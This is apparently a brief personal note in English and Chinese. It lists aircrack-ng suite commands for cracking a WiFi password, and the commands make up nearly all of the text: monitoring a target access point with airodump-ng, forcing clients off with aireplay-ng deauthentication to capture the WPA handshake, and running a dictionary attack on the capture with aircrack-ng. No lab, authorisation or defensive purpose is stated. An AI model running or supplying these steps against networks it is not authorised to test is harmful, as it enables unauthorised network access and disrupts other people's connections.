# wifi password 
## 01
chat and copy BSSIC and CH and STATION

EG: airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/lingdu/卓面/handshake wlan0

## 02
EG: aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0

### end to chat cap文件
### 下載密碼字典

## 02.1
EG: aircrack-ng -w home/lingdu/卓面/password.txt -b 60:32:B1:56:3F:B2 / home/lingdu/卓面/handshake-0*.cap